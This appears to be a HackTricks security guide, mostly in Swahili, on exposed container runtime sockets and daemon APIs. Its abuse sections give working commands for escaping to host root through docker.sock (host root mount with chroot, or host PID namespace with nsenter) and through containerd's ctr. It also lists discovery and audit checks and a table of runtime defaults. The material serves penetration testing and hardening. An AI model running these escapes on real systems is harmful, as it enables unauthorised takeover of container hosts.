# Runtime API Na Ufichuzi wa Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Matukio mengi halisi ya uvunjaji wa container hayaanzi kabisa kwa namespace escape. Huanza kwa kupata ufikiaji wa runtime control plane. Ikiwa workload inaweza kuzungumza na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyowekwa au listener wa TCP ulio wazi, mshambuliaji anaweza kuomba container mpya yenye vibali vya juu, ku-mount filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika yale matukio, runtime API ndiyo mpaka halisi wa usalama, na kuiteleza kunakaribia sana kuathiri host.

Hivyo basi ufichuzi wa runtime socket unatakiwa kuandikwa tofauti na kinga za kernel. Container yenye seccomp ya kawaida, capabilities, na MAC confinement bado inaweza kuwa umbali wa wito mmoja wa API kutoka kwa kuathiriwa kwa host ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imefanywa mount ndani yake. Isolation ya kernel ya container iliyopo inaweza kufanya kazi kama ilivyokusudiwa wakati runtime management plane bado iko wazi kabisa.

## Mifumo ya Upatikanaji ya Daemon

Docker Engine kwa jadi inaonyesha privileged API yake kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria pia imewahi kuonekana kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener iliyo na ulinzi wa TLS kwenye `2376`. Kufichua daemon kwa mbali bila TLS imara na uthibitishaji wa client kunageuza Docker API kuwa interface ya remote root.

containerd, CRI-O, Podman, na kubelet zinaonyesha uso sawa wenye athari kubwa. Majina na workflows zinaweza kutofautiana, lakini mantiki haitofautiani. Ikiwa interface inaruhusu mwitachaji kuunda workloads, ku-mount host paths, kupata credentials, au kubadilisha containers zinazoendesha, interface hiyo ni channel ya privileged management na inapaswa kutendewa ipasavyo.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks za zamani au maalum zaidi zinaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizo hazitokei mara kwa mara katika mazingira ya kisasa, lakini zinapokumbana nazo zinapaswa kutendewa kwa tahadhari ile ile kwa sababu zinawakilisha runtime-control surfaces badala ya sockets za kawaida za application.

## Upatikanaji wa Mbali Salama

Kama daemon lazima ifichuliwe zaidi ya local socket, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana kwa mutual authentication ili daemon ithibitishe client na client ithibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kwa plain HTTP kwa urahisi ni moja ya makosa hatari zaidi katika usimamizi wa container kwa sababu API surface ni ya kutosha kuunda privileged containers moja kwa moja.

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotegemea systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha process inarithi socket iliyofunguliwa tayari kutoka kwa systemd badala ya binding yake moja kwa moja. Somo muhimu sio sintaksia kamili bali matokeo ya usalama. Mara daemon inaposikiliza zaidi ya socket ya ndani iliyo na ruhusa kali, transport security na client authentication zinakuwa lazima badala ya kuwa hardening ya hiari.

## Utumiaji vibaya

Ikiwa runtime socket ipo, thibitisha ni ipi, je kuna compatible client, na kama upatikanaji wa raw HTTP au gRPC unawezawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinaweza kutofautisha kati ya njia iliyokufa, socket iliyopachikwa lakini isiyoweza kufikiwa, na live privileged API. Ikiwa client atafanikiwa, swali linalofuata ni kama API inaweza kuanzisha container mpya yenye host bind mount au host namespace sharing.

### Full Example: Docker Socket To Host Root

Ikiwa `docker.sock` inaweza kufikiwa, classical escape ni kuanzisha container mpya ambayo ita-mount host root filesystem kisha kutumia `chroot` ndani yake:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii inatoa utekelezaji wa host-root moja kwa moja kupitia Docker daemon. Athari hazizuiliki kwa kusoma faili pekee. Mara tu ndani ya container mpya, mshambuliaji anaweza kubadilisha faili za host, kuvuna credentials, kuingiza persistence, au kuanza workloads za ziada zenye ruhusa.

### Mfano Kamili: Docker Socket To Host Namespaces

Ikiwa mshambuliaji anapendelea kuingia kwenye namespace badala ya upatikanaji wa filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii inamfikia host kwa kumuomba runtime iunde container mpya yenye ufichuzi wazi wa host-namespace, badala ya kuchukua faida ya ile iliyopo.

### Mfano Kamili: containerd Socket

socket iliyopachikwa ya `containerd` kwa kawaida ni hatari kwa kiasi sawa:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Athari ni tena kuvamiwa kwa host. Hata kama Docker-specific tooling haipo, API nyingine ya runtime bado inaweza kutoa mamlaka sawa ya usimamizi.

## Ukaguzi

Lengo la ukaguzi huu ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ingepaswa kubaki nje ya trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Kinachovutia hapa:

- Socket ya runtime iliyopachikwa kwa kawaida ni primitive ya moja kwa moja ya utawala badala ya ufunuo wa taarifa tu.
- Mkusikaji wa TCP kwenye `2375` bila TLS inapaswa kutambulika kama hali ya uvunjifu wa usalama wa mbali.
- Variables za mazingira kama `DOCKER_HOST` mara nyingi zinaonyesha kwamba workload ilikuwa imeundwa kwa makusudi kuwasiliana na host runtime.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhoofishaji wa kawaida kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` inasikiliza kwenye socket ya ndani na daemon kawaida huendesha kama root | kupachika `/var/run/docker.sock`, kufichua `tcp://...:2375`, TLS dhaifu au isiyopo kwenye `2376` |
| Podman | CLI bila daemon kwa chaguo-msingi | Hakuna daemon ya muda mrefu yenye ruhusa inayohitajika kwa matumizi ya kawaida ya ndani; API sockets zinaweza bado kufichuliwa wakati `podman system service` imewezeshwa | kufichua `podman.sock`, kuendesha service kwa upana, matumizi ya API kama root |
| containerd | Local privileged socket | Administrative API inafichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na zana za kiwango cha juu | kupachika `containerd.sock`, upatikanaji mpana wa `ctr` au `nerdctl`, kufichua namespaces zenye ruhusa |
| CRI-O | Local privileged socket | CRI endpoint imetengwa kwa vipengele vinavyoaminika vinavyoishi kwenye node | kupachika `crio.sock`, kufichua CRI endpoint kwa workloads zisizoaminika |
| Kubernetes kubelet | Node-local management API | Kubelet haipaswi kupatikana kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials, na sifa za utekelezaji kulingana na authn/authz | kupachika kubelet sockets au certs, auth dhaifu ya kubelet, host networking pamoja na kubelet endpoint inayofikika |
{{#include ../../../banners/hacktricks-training.md}}
